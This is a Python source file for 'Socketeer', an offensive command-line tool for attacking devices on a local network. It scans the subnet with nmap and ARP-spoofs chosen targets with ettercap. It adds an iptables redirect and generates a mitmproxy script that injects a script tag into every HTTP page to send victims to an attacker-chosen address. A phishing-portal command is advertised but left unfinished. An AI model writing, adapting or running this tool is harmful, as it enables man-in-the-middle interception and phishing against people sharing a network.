#!/usr/bin/env python3
#Author: Icarus (www.icarus.tk)
#This file is a part of Socketeer

import sys, traceback
import os
import subprocess as sp
import time
import re

# Start banner
os.system("cat src/banner.txt | lolcat")


def main():
    try:

        #Splash screen with iface info and current ip

        def info_splash():
            current_iface = os.popen("route | awk '/Iface/{getline; print $8}'").read()
            current_addr  = os.popen("ip route get 1.2.3.4 | awk '{print $7}'").read()
            current_ssid  = os.popen("iwgetid -r").read()
            print(" " "\u001b[35;1m[➔ Info]: " "\u001b[0mCurrent Interface:",f"\u001b[33;1m{current_iface}") 
            print(" " "\u001b[35;1m[➔ Info]: " "\u001b[0mCurrent SSID:", f"\u001b[33;1m{current_ssid}") 
            print(" " "\u001b[35;1m[➔ Info]: " "\u001b[0mCurrent inet:", f"\u001b[33;1m{current_addr}")

        def clear():
            os.system("clear")

        def scan():
            addr = os.popen("ip route show | grep -i -m1 'default via' | awk '{print $3}'").read()
            addr = addr.replace("\n","")
            #scaniface = input("\n"" " "\u001b[34;1mEnter the name of your network interface: ") 
            #out = os.popen("sudo arp-scan -I "+scaniface+" -l > src/scan.txt").read()
            out = os.popen("nmap " + addr + "/24 -n -sP | grep -i 'Nmap scan report' | awk '{print $5}' > src/scan.txt").read()
            with open('src/scan.txt', 'r') as scant:
                outlist = scant.readlines()
                outform = []
                for ip in outlist:
                    outform.append(ip.replace("\n",""))
                scanstring = ' '.join([str(scanout) for scanout in outform])
                print("\n" " " "\u001b[35;1m[➔ Scan]: " "\u001b[0mConnected IP Addresses:", " " "\n" "\n" f" \u001b[33;1m{scanstring.split()}")
            open('src/scan.txt','w').close()
        
        def target():
            with open('src/target.txt', 'a') as targetf:
                targetnum = int(input("\n" " " "\u001b[34;1mEnter the number of targets: "))
                for n in range(targetnum):
                    targetip = input("\n"" " "\u001b[34;1mEnter the target IP address: ") 
                    targetf.write("/"+targetip+"//" "\n")
            print(" " "\n" " \u001b[35;1m[➔ Info]:" " \u001b[0mTarget IP has been set")

        def htspoof():
            if os.path.getsize('src/target.txt') == 0:
                print("\n" " " "\u001b[35;1m[➔ Alert]:" " " "\u001b[31;1mYou have to set your target IP first!")
            else:
                with open('src/target.txt', 'r') as targetf:
                    print("\n "" " "\u001b[35;1m[➔ Info]: " "Running ARP Spoofing...")
                    time.sleep(0.5)
                    ettercommand = ("sudo ettercap -Tq -M ARP")
                    with open('src/arp.txt','r') as arp:
                        iplist = targetf.readlines()
                        iplistformatted =[]
                        for ip in iplist:
                            iplistformatted.append(ip.replace("\n",""))
                        ipstring = ' '.join([str(arpip) for arpip in iplistformatted])
                        #print(ipstring)
                        try:
                            os.popen("sudo ettercap -D -M ARP "+ ipstring).read()
                            print("\n" " " "\u001b[35;1m[➔ Info]:" " " "\u001b[35;1mArp Spoofing done")
                            print("\n" " " "\u001b[35;1m[➔ Info]: " " Setting up iptables rules...")
                            os.popen("iptables -t nat -A PREROUTING -p TCP -j REDIRECT --destination-port 80 --to-port 8080").read() 
                            print("\n" " " "\u001b[35;1m[➔ Alert]: " "\u001b[31;1mhtspoof done!")
                        except:
                            print("\n" " " "\u001b[35;1m[➔ Alert]:" " " "\u001b[31;1mPlease make sure that the IP exists and is formatted correctly!")

                open('src/target.txt', 'w').close()
 
        def redirectlog():
            print("\n" " " "\u001b[35;1m[➔ Alert]: " "\u001b[31;1m Please be sure to run htspoof on your target before setting your redirect IP")
            spoofip = input("\n"" " "\u001b[34;1mEnter the IP address to redirect to (IP:PORT): ")

            with open('src/dumpscript.py', 'w') as dumpscript:
                dumpscript.write(f'''\
import mitmproxy
def response(flow):
    flow.response.content = flow.response.content.replace(b"</body>",b"</body><script>location = 'http://{spoofip}'</script>")
                

                ''')
            mitmdump = os.system("mitmdump -s src/dumpscript.py")
            print(" ",mitmdump, sep=" ")
       
        def portal():
            return "Portal command success - incomplete"
        
        def iplookup():
            lookupip = input("\n"" " "\u001b[34;1mEnter the IP address to lookup: ")


        def commands():
            helpstr = '''\n\n Available Commands:

                            \u001b[33;1mcommands - Displays this help page

                            \u001b[33;1mscan - Scans the current network for all devices

                            \u001b[33;1mtarget - Set target device

                            \u001b[33;1mhtspoof - Redirect user to specific webpage

                            \u001b[33;1mredirectlog - Set the redirection IP for all HTTP pages and monitor traffic (format: <ip>:<port>)

                            \u001b[33;1mportal - Generate phishing page/portal for redirection

                            \u001b[33;1miplookup - Find out device name of IP (If it exists)

                           '''
            print(helpstr)



        def shell():
 
            cmdlist = {"scan":scan,"target":target,"htspoof":htspoof,"redirectlog":redirectlog,"commands":commands,"portal":portal,"iplookup":iplookup,"clear":clear}

            info_splash()

            print(" " '\u001b[35m[Type "commands" to get a list of available commands]')

            while True:
                prompt = input(" " "\n" "\n"" \u001b[36;1msktr❯❯\u001b[0m ")

                try:
                    cmdlist[prompt]()
                except:
                    print("\n" " " "\u001b[31;1mInvalid Command") 


# Running Shell

        shell()

# Interrupt Handling for CTRL-C

    except KeyboardInterrupt:
        print("\n" "\n" " \u001b[31;1mExiting...")


# Getting root privilages

rootchk = os.getuid()
if rootchk != 0:
    sys.exit(" ""\u001b[31;1mPlease run Socketeer with Root Privilages")
else:
    main()


